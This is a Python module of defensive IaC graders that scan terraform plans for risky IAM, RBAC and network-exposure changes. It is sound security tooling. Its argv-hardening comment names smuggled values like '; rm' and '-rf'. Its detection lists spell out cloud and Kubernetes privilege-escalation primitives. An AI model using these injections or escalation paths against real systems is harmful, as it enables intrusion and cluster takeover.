"""IaC graders + the cloud-IAM change sensor (IAC-KICKOFF.md, Phase 1).

Functional graders are blind to infrastructure intent and to cloud-IAM blast radius: a dangerous
grant rides inside a 200-resource `terraform plan`, passes every test/lint/type gate, and only
surfaces as an incident or a failed audit later. These graders make IaC a first-class sense on the
verdict bus and **catch dangerous IAM changes before `apply`**.

Three things live here, all PURE over canned tool output (the `Runner` is injected, so the whole
matrix runs offline with no terraform/trivy installed):

  * `parse_terraform_validate` — syntax/schema errors gate (GraderKind.IAC).
  * `parse_terraform_plan`      — a `terraform show -json` plan → destroy/replace visibility
                                  (IAC_DRIFT) + the IAM sensor (IAM_RISK).
  * `parse_trivy_config`        — IaC misconfiguration scan (GraderKind.SECURITY).

The IAM sensor (`extract_iam_changes` + `iam_risk_issues`) is the valuable core: it normalizes an
IAM-affecting change from any provider into one shape and runs deterministic risk rules
(wildcard / privilege-escalation / public-principal / admin-grant / open-ingress) that GATE.
`plan_summary` / `destructive_changes` feed the Phase-4 gateway escalation.
"""

from __future__ import annotations

import fnmatch
import ipaddress
import json
import re
from dataclasses import dataclass, field

from ..verdict.models import Confidence, GraderKind, Issue, IssueKind, Severity
from .graders import GraderSpec

# Argv hardening: every path/value interpolated into a grader's argv is charset-validated so a value
# like `--post-renderer=x`, `-rf`, `; rm`, or a leading-`-` option can't be smuggled into the tool
# (argv form already blocks the shell; this blocks option-injection too). Used by every spec below.
_SAFE_ARG = re.compile(r"^[A-Za-z0-9_./@][A-Za-z0-9_./@=:+,-]*$")


def safe_arg(value: str, what: str = "argument") -> str:
    if not isinstance(value, str) or not _SAFE_ARG.match(value):
        raise ValueError(f"unsafe {what}: {value!r}")
    return value


def safe_args(values: list[str], what: str = "argument") -> list[str]:
    return [safe_arg(v, what) for v in (values or [])]


def safe_path(value: str, what: str = "path") -> str:
    """A path argument: charset-safe AND no remote scheme (`https://`/`oci://` — `kubectl -f` and
    `helm template` FETCH those: SSRF / hostile remote chart) AND no `..` traversal segment."""
    safe_arg(value, what)
    if "://" in value:
        raise ValueError(f"unsafe {what} (remote URL not allowed): {value!r}")
    if value.startswith("/"):  # absolute → scans/reads OUTSIDE the repo (info-leak); repo-relative only
        raise ValueError(f"unsafe {what} (absolute path not allowed): {value!r}")
    if ".." in value.replace("\\", "/").split("/"):
        raise ValueError(f"unsafe {what} (path traversal): {value!r}")
    return value


def safe_paths(values: list[str], what: str = "path") -> list[str]:
    return [safe_path(v, what) for v in (values or [])]

# ---------------------------------------------------------------------------
# Severity mapping for config scanners (trivy/checkov share this vocabulary).
# ---------------------------------------------------------------------------
_SCAN_SEV = {
    "critical": Severity.CRITICAL, "high": Severity.ERROR, "medium": Severity.WARNING,
    "moderate": Severity.WARNING, "low": Severity.INFO, "unknown": Severity.INFO, "info": Severity.INFO,
}


def _scan_severity(s: str) -> Severity:
    return _SCAN_SEV.get((s or "low").lower(), Severity.WARNING)


def _as_list(x: object) -> list:
    """Terraform/cloud policy fields are str-or-list-or-absent; normalize to a list."""
    if x is None:
        return []
    return list(x) if isinstance(x, (list, tuple)) else [x]


def _load_json(out: str) -> dict:
    # RecursionError: a deeply-nested attacker JSON makes json.loads itself recurse past the limit —
    # not a JSONDecodeError. Catch it (and ValueError/MemoryError) so a hostile plan can't crash us.
    try:
        data = json.loads(out or "{}")
    except (json.JSONDecodeError, RecursionError, ValueError, MemoryError):
        return {}
    return data if isinstance(data, dict) else {}


# ===========================================================================
# terraform/tofu validate  — GraderKind.IAC, gates on validation errors.
# ===========================================================================
def parse_terraform_validate(out: str, err: str = "") -> list[Issue]:
    """`terraform validate -json`: {"valid":bool,"diagnostics":[{severity,summary,detail,range}]}."""
    data = _load_json(out)
    issues: list[Issue] = []
    for d in data.get("diagnostics", []) if isinstance(data, dict) else []:
        sev = Severity.ERROR if (d.get("severity") == "error") else Severity.WARNING
        rng = d.get("range") or {}
        fn = rng.get("filename", "")
        line = (rng.get("start") or {}).get("line", "")
        loc = f"{fn}:{line}" if fn else None
        issues.append(Issue(
            kind=IssueKind.OTHER, severity=sev, source=GraderKind.IAC,
            message=(d.get("summary") or "validation error").strip(),
            locator=loc, locator_precise=bool(loc),
            detail_json=json.dumps({"detail": d.get("detail", "")}),
        ))
    return issues


# ===========================================================================
# The IAM change sensor — one normalized model fed from a terraform plan.
# ===========================================================================
# Resource types that carry an IAM / access-control / network-exposure change. Curated substrings
# cover AWS (aws_iam_*, *_policy, lambda_permission, security_group), GCP (*_iam_member/binding/policy),
# Azure (role_assignment/definition), and Kubernetes (kubernetes_role*/role_binding).
_IAM_TYPE_SUBSTRINGS = (
    "iam", "_iam_", "_policy", "role_assignment", "role_definition", "role_binding", "rolebinding",
    "cluster_role", "clusterrole", "kubernetes_role", "security_group", "access_policy",
    "lambda_permission", "_grant", "kms_key", "glacier_vault", "secretsmanager",
    "public_access_block", "ram_resource_share", "ram_principal_association", "organizations_policy",
    "service_account_key",
    # network-exposure parity (round-9 F1/F2): GCP firewall + Azure NSG rule, like aws_security_group.
    "firewall", "security_rule", "network_security",
    # non-policy public exposure (round-9 F3/F4, round-10 F10-1): S3 ACL + publicly-accessible DBs
    # + Azure anonymous public-blob storage accounts.
    "bucket_acl", "db_instance", "redshift_cluster", "rds_cluster", "storage_account",
)


def is_iam_resource(rtype: str) -> bool:
    t = (rtype or "").lower()
    return any(s in t for s in _IAM_TYPE_SUBSTRINGS)


def _cloud_of(rtype: str) -> str:
    t = (rtype or "").lower()
    if t.startswith("aws_"):
        return "aws"
    if t.startswith("google_"):
        return "gcp"
    if t.startswith("azurerm_") or t.startswith("azuread_"):
        return "azure"
    if t.startswith("kubernetes_"):
        return "k8s"
    return "unknown"


def _change_type(actions: list[str]) -> str | None:
    """Map terraform `change.actions` to a normalized change_type; None for no-op/read (skip)."""
    a = set(actions or [])
    if not a or a <= {"no-op", "read"}:
        return None
    if {"create", "delete"} <= a:
        return "replace"
    if "delete" in a:
        return "revoke"
    if "create" in a:
        return "grant"
    if "update" in a:
        return "widen"
    return "widen"


@dataclass
class IamChange:
    """A normalized IAM-affecting change (IAC-KICKOFF.md). `after` is the planned resource state the
    risk rules evaluate; `change_type` drives gateway escalation."""

    cloud: str
    change_type: str
    address: str
    after: dict = field(default_factory=dict)
    source_locus: str = ""
    rtype: str = ""
    # `change.after_unknown` — terraform marks fields "(known after apply)" here (True / nested True).
    # An unknown IAM-relevant field is invisible in `after`; the risk rules must fail CLOSED on it.
    after_unknown: dict = field(default_factory=dict)


# IAM-relevant `after`/`after_unknown` keys. A computed (unknown-at-plan) value for any of these
# means the change's blast radius is invisible in `after` — the grader must fail CLOSED, not pass.
_UNKNOWN_IAM_KEYS = {
    "policy", "policy_data", "assume_role_policy", "inline_policy", "managed_policy_arns",
    "members", "member", "role", "policy_arn", "role_definition_id", "role_definition_name",
    "rule", "role_ref", "subject", "permissions", "ingress", "cidr_blocks", "cidr_ipv4", "cidr_ipv6",
    "block_public_acls", "block_public_policy", "ignore_public_acls", "restrict_public_buckets",
    "acl", "access_control_policy", "publicly_accessible", "source_ranges", "source_address_prefix",
    "source_address_prefixes", "allow_blob_public_access", "allow_nested_items_to_be_public",
}


def _has_unknown(node: object, depth: int = 0) -> bool:
    """True if `node` (a terraform after_unknown value) marks anything computed — a literal True, or
    any True nested in a list/dict (a computed string is `true`; a computed object is `{k: true}`).
    Past the depth bound we FAIL CLOSED (assume unknown) so a pathologically-nested value can't
    silently downgrade to 'known' — matching the rule's fail-closed contract (round-11 F1)."""
    if depth > 12:
        return True
    if node is True:
        return True
    if isinstance(node, dict):
        return any(_has_unknown(v, depth + 1) for v in node.values())
    if isinstance(node, list):
        return any(_has_unknown(v, depth + 1) for v in node)
    return False


def _unknown_iam_fields(after_unknown: dict) -> list[str]:
    """The IAM-relevant fields that are computed (known after apply) in this change."""
    return sorted(k for k in _UNKNOWN_IAM_KEYS if _has_unknown(after_unknown.get(k)))


def extract_iam_changes(plan: dict) -> list[IamChange]:
    """Pull IAM-affecting `resource_changes` out of a `terraform show -json` plan document."""
    out: list[IamChange] = []
    for rc in (plan.get("resource_changes", []) if isinstance(plan, dict) else []):
        if not isinstance(rc, dict):  # a hostile `[null]`/"x" entry must not crash the grader
            continue
        rtype = rc.get("type", "")
        change = rc.get("change", {}) or {}
        after = (change.get("after") or {}) if isinstance(change.get("after"), dict) else {}
        unknown = (change.get("after_unknown") or {}) if isinstance(change.get("after_unknown"), dict) else {}
        # Extract when the type is a known IAM type OR — generically — when `after` carries any policy
        # document (a Statement) OR when an IAM-relevant field is computed (known after apply). The
        # last clause catches a non-IAM-typed resource whose computed inline policy is invisible in
        # `after` (round-6 finding P2: "the plan is not reality").
        if not is_iam_resource(rtype) and not _statements(after) and not _unknown_iam_fields(unknown):
            continue
        ct = _change_type(change.get("actions", []))
        if ct is None:
            continue
        out.append(IamChange(
            cloud=_cloud_of(rtype), change_type=ct, address=rc.get("address", ""),
            after=after, source_locus=rc.get("address", ""), rtype=rtype, after_unknown=unknown,
        ))
    return out


# --- statement extraction (AWS-style policy documents) ---------------------
def _collect_policy_docs(node: object, docs: list[dict], depth: int = 0) -> None:
    """Recursively find IAM policy documents ANYWHERE in an `after` state — not just under
    `policy`/`assume_role_policy`, but `inline_policy`, KMS key `policy`, GCP `policy_data`, etc.
    A doc is a dict (or JSON string) carrying a `Statement` key. Depth-bounded against hostile nesting."""
    if depth > 8:
        return
    if isinstance(node, str):
        if "Statement" in node:  # cheap prefilter before parsing
            try:
                d = json.loads(node)
            except (json.JSONDecodeError, RecursionError, ValueError):
                return
            if isinstance(d, dict) and "Statement" in d:
                docs.append(d)
    elif isinstance(node, dict):
        if "Statement" in node:
            docs.append(node)
        else:
            for v in node.values():
                _collect_policy_docs(v, docs, depth + 1)
    elif isinstance(node, list):
        for v in node:
            _collect_policy_docs(v, docs, depth + 1)


def _statements(after: dict) -> list[dict]:
    """Normalize every AWS-style IAM policy document found anywhere in `after` into
    {effect,actions,resources,principals,not_action,not_resource} dicts."""
    docs: list[dict] = []
    _collect_policy_docs(after, docs)
    stmts: list[dict] = []
    for doc in docs:
        for s in _as_list(doc.get("Statement")):
            if not isinstance(s, dict):
                continue
            stmts.append({
                "effect": s.get("Effect", "Allow"),
                "actions": [str(a) for a in _as_list(s.get("Action"))],
                "resources": [str(r) for r in _as_list(s.get("Resource"))],
                "principals": _principals(s.get("Principal")),
                # allow-by-exclusion: NotAction/NotResource grant "everything EXCEPT", the canonical
                # over-broad admin pattern — captured so _evaluate can flag it.
                "not_action": [str(a) for a in _as_list(s.get("NotAction"))],
                "not_resource": [str(r) for r in _as_list(s.get("NotResource"))],
            })
    return stmts


def _principals(p: object) -> list[str]:
    if p is None:
        return []
    if isinstance(p, str):
        return [p]
    if isinstance(p, dict):  # {"AWS": "*"} / {"AWS": ["arn:...", "*"]}
        out: list[str] = []
        for v in p.values():
            out.extend(str(x) for x in _as_list(v))
        return out
    return [str(x) for x in _as_list(p)]


_PRIVESC_ACTIONS = {
    "iam:passrole", "iam:createpolicyversion", "iam:setdefaultpolicyversion",
    "iam:attachrolepolicy", "iam:attachuserpolicy", "iam:attachgrouppolicy",
    "iam:putrolepolicy", "iam:putuserpolicy", "iam:putgrouppolicy", "iam:createaccesskey",
    "iam:createloginprofile", "iam:updateloginprofile", "iam:updateassumerolepolicy",
    "iam:createuser", "sts:assumerole",
    # round-7 R7-3: federated assume-role and cross-account lambda invoke-grant are privesc too.
    "sts:assumerolewithwebidentity", "sts:assumerolewithsaml", "lambda:addpermission",
}
_ADMIN_GCP_ROLES = {"roles/owner", "roles/editor", "roles/iam.securityadmin",
                    "roles/resourcemanager.organizationadmin"}
# GCP privilege-escalation roles — the analogue of AWS iam:PassRole (impersonate / mint keys / grant).
_PRIVESC_GCP_ROLES = {"roles/iam.serviceaccounttokencreator", "roles/iam.serviceaccountuser",
                      "roles/iam.serviceaccountkeyadmin", "roles/iam.roleadmin",
                      "roles/iam.securityadmin", "roles/iam.workloadidentityuser",
                      "roles/iam.serviceaccountadmin"}
_ADMIN_AZURE_ROLES = {"owner", "contributor", "user access administrator"}
# Built-in Azure role GUIDs (an assignment can reference role_definition_id instead of _name).
_ADMIN_AZURE_GUIDS = {"8e3af657-a8ff-443c-a75c-2fe8c4bcb635",   # Owner
                      "b24988ac-6180-42a0-ab88-20f7382dd24c"}   # Contributor
_PRIVESC_AZURE_GUIDS = {"18d7d88d-d35e-4fb5-a5c3-7773c20a72d9"}  # User Access Administrator
# Azure privilege-escalation actions (concrete, no wildcard) — granting role assignments / elevation.
_PRIVESC_AZURE_ACTIONS = ("microsoft.authorization/roleassignments/write",
                          "microsoft.authorization/elevateaccess",
                          "microsoft.authorization/denyassignments")
_PUBLIC_PRINCIPALS = {"*", "allusers", "allauthenticatedusers", "system:anonymous", "system:unauthenticated"}
# Binding a role to either of these Groups grants it to EVERY (un)authenticated principal = public.
# `system:authenticated` is the dangerous one a name-only check misses (it's not "anonymous").
_K8S_PUBLIC_GROUPS = {"system:unauthenticated", "system:authenticated"}
# Namespaces whose secrets are cluster-admin-equivalent (bootstrap / controller-manager tokens) — a
# Role reading them is as dangerous as a cluster-wide read, so it gates rather than merely advising.
_PRIVILEGED_NAMESPACES = {"kube-system", "kube-public"}
_ADMIN_MANAGED_POLICIES = ("administratoraccess", "poweruseraccess", "iamfullaccess")


def _gcp_bindings(after: dict) -> list[tuple[str, list[str]]]:
    """GCP (role, members) bindings from BOTH the top-level member/binding resources AND the
    authoritative `*_iam_policy` resources, whose bindings live in a `policy_data` JSON string
    ({"bindings":[{role,members}]}) that carries no `Statement` key."""
    out: list[tuple[str, list[str]]] = []
    if after.get("role"):
        out.append((str(after.get("role", "")),
                    [str(m) for m in _as_list(after.get("members")) + _as_list(after.get("member"))]))
    pd = after.get("policy_data")
    if isinstance(pd, str):
        try:
            doc = json.loads(pd)
        except (json.JSONDecodeError, RecursionError, ValueError):
            doc = {}
        for b in (_as_list(doc.get("bindings")) if isinstance(doc, dict) else []):
            if isinstance(b, dict):
                out.append((str(b.get("role", "")), [str(m) for m in _as_list(b.get("members"))]))
    return out


def _is_wildcard_action(a: str) -> bool:
    # A `*` or `?` ANYWHERE broadens beyond a single API call: `*`, `iam:*`, `s3:Get*`, AND the
    # mid-string `iam:*Policy` / `s3:*Object*` forms AWS also honors.
    a = a.strip()
    return "*" in a or "?" in a


def _is_privesc(a: str) -> bool:
    """An action is a privilege-escalation primitive, OR a glob that would cover one
    (`iam:Put*`, `iam:*Policy`, `iam:*`, `*` all match a privesc primitive)."""
    a = a.lower()
    if a in _PRIVESC_ACTIONS:
        return True
    if "*" in a or "?" in a:
        return any(fnmatch.fnmatchcase(p, a) for p in _PRIVESC_ACTIONS)
    return False


def _is_public_principal(p: str) -> bool:
    p = p.lower()
    # `allUsers` / `*`, AND a wildcard ANYWHERE in a principal ARN (`arn:aws:iam::*:root` = every account).
    return p in _PUBLIC_PRINCIPALS or "*" in p


def _evaluate(ch: IamChange) -> list[tuple[str, Severity, str]]:
    """Deterministic IAM risk rules over a single change → (rule_id, severity, message) hits."""
    hits: list[tuple[str, Severity, str]] = []
    after = ch.after

    # --- Fail CLOSED on computed IAM content: a "(known after apply)" policy/role/member/rule is
    # invisible in `after`, so we cannot rule out a wildcard/privesc/public grant. "Can't tell" must
    # GATE, not pass (round-6 finding P2 — the clean plan that widens at apply time). ---
    unknown = _unknown_iam_fields(ch.after_unknown)
    if unknown:
        hits.append(("UNKNOWN_IAM_CONTENT", Severity.ERROR,
                     f"IAM-relevant field(s) {unknown} are computed (known after apply) — blast radius "
                     f"cannot be verified at plan time at {ch.address}"))

    # --- AWS / generic policy-document statements ---
    for s in _statements(after):
        if str(s["effect"]).lower() != "allow":
            continue
        # Allow-by-exclusion (NotAction/NotResource) grants "everything except" → presumptively admin.
        if s.get("not_action") or s.get("not_resource"):
            hits.append(("ALLOW_BY_EXCLUSION", Severity.ERROR,
                         f"allow-by-exclusion (NotAction/NotResource) is over-broad at {ch.address}"))
        if any(_is_public_principal(p) for p in s["principals"]):
            hits.append(("PUBLIC_PRINCIPAL", Severity.CRITICAL,
                         f"policy grants access to a public principal at {ch.address}"))
        priv = [a for a in s["actions"] if _is_privesc(a)]
        if priv:
            # The DANGER is the action; a named-resource scope reduces but does not remove it.
            scoped = bool(s["resources"]) and "*" not in s["resources"]
            hits.append(("PRIVILEGE_ESCALATION", Severity.ERROR if scoped else Severity.CRITICAL,
                         f"privilege-escalation action ({priv[0]}) granted at {ch.address}"))
        if any(_is_wildcard_action(a) for a in s["actions"]):
            hits.append(("WILDCARD_ACTION", Severity.ERROR,
                         f"wildcard action granted at {ch.address}"))
        if "*" in s["resources"] and any(_is_wildcard_action(a) for a in s["actions"]):
            hits.append(("WILDCARD_RESOURCE", Severity.ERROR,
                         f"wildcard action on a wildcard resource at {ch.address}"))

    # --- AWS managed-policy attachment (admin-tier managed policies) ---
    arn = str(after.get("policy_arn", "")).lower()
    if any(arn.endswith(m) or arn.endswith("/" + m) for m in _ADMIN_MANAGED_POLICIES):
        hits.append(("ADMIN_GRANT", Severity.ERROR, f"admin managed policy attached at {ch.address}"))

    # --- GCP role/member bindings: top-level (iam_member/binding) AND policy_data (iam_policy) ---
    for role_raw, members_raw in _gcp_bindings(after):
        role = role_raw.lower()
        members = [m.lower() for m in members_raw]
        if role in _ADMIN_GCP_ROLES:
            hits.append(("ADMIN_GRANT", Severity.ERROR, f"admin role {role} granted at {ch.address}"))
        if role in _PRIVESC_GCP_ROLES:
            hits.append(("PRIVILEGE_ESCALATION", Severity.CRITICAL,
                         f"privilege-escalation role {role} granted at {ch.address}"))
        if any(m in _PUBLIC_PRINCIPALS or m.split(":")[-1] in _PUBLIC_PRINCIPALS for m in members):
            hits.append(("PUBLIC_PRINCIPAL", Severity.CRITICAL,
                         f"role granted to a public member at {ch.address}"))

    # --- Azure: built-in admin assignment (by NAME or role_definition_id GUID) AND custom role ---
    az_role = str(after.get("role_definition_name", "")).lower()
    az_guid = str(after.get("role_definition_id", "")).rstrip("/").split("/")[-1].lower()
    if az_role in _ADMIN_AZURE_ROLES or az_guid in _ADMIN_AZURE_GUIDS:
        hits.append(("ADMIN_GRANT", Severity.ERROR, f"admin role granted at {ch.address}"))
    if az_guid in _PRIVESC_AZURE_GUIDS:
        hits.append(("PRIVILEGE_ESCALATION", Severity.CRITICAL,
                     f"User Access Administrator granted at {ch.address}"))
    for perm in _as_list(after.get("permissions")):
        if isinstance(perm, dict):
            acts = [str(a) for a in _as_list(perm.get("actions")) + _as_list(perm.get("data_actions"))]
            if any(_is_wildcard_action(a) for a in acts):
                hits.append(("ADMIN_GRANT", Severity.ERROR,
                             f"custom role grants a wildcard action at {ch.address}"))
            if any(p in a.lower() for a in acts for p in _PRIVESC_AZURE_ACTIONS):
                hits.append(("PRIVILEGE_ESCALATION", Severity.CRITICAL,
                             f"custom role grants a role-assignment/elevation action at {ch.address}"))

    # --- GCP long-lived service-account KEY creation (exportable credential = exfil / privesc) ---
    if "service_account_key" in ch.rtype and ch.change_type in ("grant", "widen", "replace"):
        hits.append(("CREDENTIAL_EXPOSURE", Severity.ERROR,
                     f"long-lived service-account key created at {ch.address}"))

    # --- AWS S3 public-access-block re-exposing the bucket account/bucket-wide ---
    if "public_access_block" in ch.rtype:
        flags = ("block_public_acls", "block_public_policy", "ignore_public_acls",
                 "restrict_public_buckets")
        # A PAB protects ONLY when all four flags are True. A DELETE (revoke) removes it; a
        # create/update where any flag is False OR ABSENT (each defaults to false) leaves a gap. Both
        # re-expose the bucket and must gate — gating only explicit-False missed the absent-flag and
        # delete cases (round-6/round-7/round-8 F1: the guardrail-removal blind spot). Computed flags
        # are already gated via UNKNOWN_IAM_CONTENT.
        if ch.change_type == "revoke":
            hits.append(("PUBLIC_ACCESS_BLOCK_DISABLED", Severity.ERROR,
                         f"S3 public-access-block deleted — protection removed at {ch.address}"))
        elif not all(after.get(f) is True for f in flags):
            hits.append(("PUBLIC_ACCESS_BLOCK_DISABLED", Severity.ERROR,
                         f"S3 public-access-block not fully enabled (flag false/absent) at {ch.address}"))

    # --- AWS S3 public ACL (the non-policy public-bucket path — round-9 F3, round-10 grant-block) ---
    if "bucket_acl" in ch.rtype:
        acl = str(after.get("acl", "")).lower()
        if acl in ("public-read", "public-read-write", "authenticated-read"):
            hits.append(("PUBLIC_ACL", Severity.ERROR,
                         f"S3 canned ACL {acl!r} grants public/authenticated access at {ch.address}"))
        # The grant-block form has no `acl` field: access_control_policy { grant { grantee { uri } } }
        # with a global AllUsers/AuthenticatedUsers grantee URI = public (round-10 F10-1).
        for acp in _as_list(after.get("access_control_policy")):
            for grant in (_as_list(acp.get("grant")) if isinstance(acp, dict) else []):
                grantee = grant.get("grantee") if isinstance(grant, dict) else None
                # rstrip('/') so a trailing-slash variant can't slip the suffix match (round-11 F11-1).
                uri = str(grantee.get("uri", "")).lower().rstrip("/") if isinstance(grantee, dict) else ""
                if uri.endswith("global/allusers") or uri.endswith("global/authenticatedusers"):
                    hits.append(("PUBLIC_ACL", Severity.ERROR,
                                 f"S3 ACL grant to a public grantee ({uri}) at {ch.address}"))

    # --- Publicly-routable DB endpoint (RDS / Redshift — round-9 F4) ---
    if after.get("publicly_accessible") is True:
        hits.append(("PUBLIC_DB_ENDPOINT", Severity.ERROR,
                     f"database has a public endpoint (publicly_accessible=true) at {ch.address}"))

    # --- Azure storage account anonymous public-blob access (round-10 F10-1, the public-exposure
    # triad's Azure leg). `allow_nested_items_to_be_public` is the azurerm ≥3.0 rename. ---
    if "storage_account" in ch.rtype and (after.get("allow_blob_public_access") is True
                                          or after.get("allow_nested_items_to_be_public") is True):
        hits.append(("PUBLIC_BLOB_ACCESS", Severity.ERROR,
                     f"storage account permits anonymous public blob access at {ch.address}"))

    # --- Network exposure: open ingress (AWS SG / GCP firewall / Azure NSG — round-9 F1/F2 parity) ---
    if _open_ingress(after, ch.rtype):
        hits.append(("OPEN_INGRESS", Severity.ERROR,
                     f"ingress open to the world at {ch.address}"))

    # --- Kubernetes RBAC ---
    if ch.cloud == "k8s":
        hits.extend(_k8s_rbac(ch))

    return hits


_WORLD_CIDRS = {"0.0.0.0/0", "::/0"}


def _cidrs_cover_world(cidrs) -> bool:
    """True if the CIDR strings cover at least HALF of either IP space. Catches the literal
    0.0.0.0/0 / ::/0 AND a split like 0.0.0.0/1 + 128.0.0.0/1 (the whole internet in two halves) that
    plain string-matching misses (round-10 F10-2). Real CIDR math via `ipaddress`, hostile values
    skipped."""
    v4: list[ipaddress.IPv4Network] = []
    v6: list[ipaddress.IPv6Network] = []
    for c in cidrs:
        try:
            n = ipaddress.ip_network(str(c), strict=False)
        except ValueError:
            continue
        (v6 if isinstance(n, ipaddress.IPv6Network) else v4).append(n)  # type: ignore[arg-type]
    # collapse_addresses merges to non-overlapping blocks, so the sum is exact (no double count).
    return (bool(v4) and sum(n.num_addresses for n in ipaddress.collapse_addresses(v4)) >= (1 << 31)) \
        or (bool(v6) and sum(n.num_addresses for n in ipaddress.collapse_addresses(v6)) >= (1 << 127))


def _block_open(d: dict) -> bool:
    """A cidr block open to the world via any shape: cidr_blocks / ipv6_cidr_blocks (lists, on
    aws_security_group[_rule]) or cidr_ipv4 / cidr_ipv6 (strings, on the newer dedicated rule)."""
    vals: set[str] = set()
    for k in ("cidr_blocks", "ipv6_cidr_blocks"):
        vals |= {str(x) for x in _as_list(d.get(k))}
    for k in ("cidr_ipv4", "cidr_ipv6"):
        v = d.get(k)
        if isinstance(v, str):
            vals.add(v)
    return _cidrs_cover_world(vals)


def _azure_rule_open(d: dict) -> bool:
    """An Azure NSG rule allowing inbound from the whole internet (*/Internet/0.0.0.0/0, incl. a
    split-CIDR). An ABSENT `direction` is treated as inbound — fail closed, matching the GCP default
    (round-10 F10-3)."""
    if str(d.get("access", "")).lower() != "allow":
        return False
    if str(d.get("direction", "inbound")).lower() != "inbound":
        return False
    raw = [str(d.get("source_address_prefix", ""))]
    raw += [str(x) for x in _as_list(d.get("source_address_prefixes"))]
    if {p.lower() for p in raw} & {"*", "internet"}:
        return True
    return _cidrs_cover_world(raw)


def _open_ingress(after: dict, rtype: str = "") -> bool:
    rt = rtype.lower()
    # aws_security_group_rule (type=ingress) OR aws_vpc_security_group_ingress_rule (no `type` field).
    if ("ingress_rule" in rt or str(after.get("type", "")).lower() == "ingress") and _block_open(after):
        return True
    # aws_security_group with inline ingress = [{cidr_blocks: [...]}].
    if any(isinstance(rule, dict) and _block_open(rule) for rule in _as_list(after.get("ingress"))):
        return True
    # GCP google_compute_firewall: an INGRESS rule (default direction) with world source_ranges (F1).
    if "firewall" in rt and str(after.get("direction", "INGRESS")).upper() == "INGRESS" \
            and _cidrs_cover_world([str(x) for x in _as_list(after.get("source_ranges"))]):
        return True
    # Azure NSG: a standalone azurerm_network_security_rule, or inline `security_rule` blocks (F2).
    return ("security_rule" in rt or "network_security" in rt) and (
        _azure_rule_open(after)
        or any(isinstance(r, dict) and _azure_rule_open(r)
               for r in _as_list(after.get("security_rule"))))


_RBAC_PRIVESC_VERBS = {"escalate", "bind", "impersonate"}
_RBAC_SECRET_VERBS = {"get", "list", "watch", "*"}
# (resource, create) pairs that are escalation primitives even without `*`: minting SA tokens, exec.
_RBAC_DANGEROUS_RESOURCES = {"serviceaccounts/token", "pods/exec", "pods/attach"}
# Binding to ANY of these built-in cluster roles is an admin/secret-read grant — not just
# `cluster-admin`: the aggregated `admin`/`edit` both read secrets, and `admin` can create
# rolebindings in its namespace (in-namespace privilege escalation). Round-6 finding R1.
_RBAC_BUILTIN_ADMIN_ROLES = {"cluster-admin", "admin", "edit"}
# Resource-scoped RBAC privilege-escalation primitives — cluster-takeover even WITHOUT a wildcard:
# admission webhooks (intercept/mutate every API write), CSR approval / signers (mint any identity's
# client certs), node mutation (relabel/taint → schedule onto a controlled node → escape). Maps a
# resource (incl. subresource form) to the verbs that escalate on it. Round-6 finding R3.
_RBAC_RESOURCE_PRIVESC = {
    "mutatingwebhookconfigurations": {"create", "update", "patch", "*"},
    "validatingwebhookconfigurations": {"create", "update", "patch", "*"},
    "certificatesigningrequests": {"update", "approve", "*"},
    "certificatesigningrequests/approval": {"update", "approve", "*"},
    "signers": {"approve", "sign", "*"},
    "nodes": {"update", "patch", "*"},
    # proxy subresources reach the kubelet/component API directly (exec into any pod, read any
    # node) — a DISTINCT resource string from `nodes`/`pods`, so it needs its own entry (round-7 F3).
    "nodes/proxy": {"get", "create", "update", "*"},
    "pods/proxy": {"get", "create", "*"},
    "services/proxy": {"get", "create", "*"},
}
# Write verbs over the `*` resource = create/modify ANYTHING (incl. rolebindings & webhooks) → takeover.
_RBAC_WRITE_VERBS = {"create", "update", "patch", "delete", "deletecollection"}


def _rbac_resource_privesc(verbs: set[str], res: set[str]) -> list[str]:
    """Resource-scoped privilege-escalation primitives present in (verbs × resources). Returns the
    matched resource labels (empty ⇒ none)."""
    return sorted(r for r in res if (verbs & _RBAC_RESOURCE_PRIVESC.get(r, set())))


def _k8s_rbac(ch: IamChange) -> list[tuple[str, Severity, str]]:
    """RBAC rules for the TERRAFORM kubernetes provider (snake_case: rule/role_ref/subject). Kept at
    parity with the native-manifest sensor (verel.ci.k8s._role_risks): wildcard, escalate/bind/
    impersonate, cluster-wide secret read, cluster-admin / system:masters, anonymous subjects."""
    hits: list[tuple[str, Severity, str]] = []
    after = ch.after
    cluster = "cluster" in ch.rtype.lower()
    # A Role in kube-system/kube-public is cluster-admin-EQUIVALENT (its secrets hold the bootstrap /
    # controller-manager tokens), so treat its secret/read-all reach at the elevated (gating) severity.
    meta = _as_list(after.get("metadata"))
    ns = str(meta[0].get("namespace", "")) if meta and isinstance(meta[0], dict) else ""
    elevated = cluster or ns in _PRIVILEGED_NAMESPACES
    # A ClusterRole that AGGREGATES other roles (aggregation_rule) grows silently to whatever the
    # label-selected roles grant — surface an advisory rather than green-lighting an empty `rule`.
    if after.get("aggregation_rule"):
        hits.append(("AGGREGATION_RULE", Severity.WARNING,
                     f"ClusterRole aggregates other roles (aggregation_rule) at {ch.address}"))
    for rule in _as_list(after.get("rule")):
        if not isinstance(rule, dict):
            continue
        verbs = {str(v).lower() for v in _as_list(rule.get("verbs"))}
        res = {str(r).lower() for r in _as_list(rule.get("resources"))}
        nonres = {str(u) for u in _as_list(rule.get("non_resource_urls"))}
        if "*" in verbs and ("*" in res or "*" in nonres):
            hits.append(("WILDCARD_RBAC", Severity.ERROR, f"RBAC rule grants */* at {ch.address}"))
        if (verbs & {"create", "*"}) and (res & _RBAC_DANGEROUS_RESOURCES):
            hits.append(("PRIVILEGE_ESCALATION", Severity.CRITICAL,
                         f"RBAC grants create on {sorted(res & _RBAC_DANGEROUS_RESOURCES)} at {ch.address}"))
        if verbs & _RBAC_PRIVESC_VERBS:
            hits.append(("PRIVILEGE_ESCALATION", Severity.CRITICAL,
                         f"RBAC grants {sorted(verbs & _RBAC_PRIVESC_VERBS)} at {ch.address}"))
        escres = _rbac_resource_privesc(verbs, res)
        if escres:
            hits.append(("PRIVILEGE_ESCALATION", Severity.CRITICAL,
                         f"RBAC grants an escalation primitive on {escres} at {ch.address}"))
        # Write to ALL resources (`*`) = create rolebindings/webhooks → takeover (round-7 F1).
        if "*" in res and (verbs & _RBAC_WRITE_VERBS):
            hits.append(("PRIVILEGE_ESCALATION", Severity.CRITICAL if elevated else Severity.ERROR,
                         f"grants {'cluster-wide ' if cluster else ''}write to all resources "
                         f"(incl. rolebindings/webhooks) at {ch.address}"))
        reads = verbs & _RBAC_SECRET_VERBS
        if "secrets" in res and reads:
            hits.append(("SECRETS_ACCESS", Severity.ERROR if elevated else Severity.WARNING,
                         f"grants {'cluster-wide ' if cluster else ''}read of secrets at {ch.address}"))
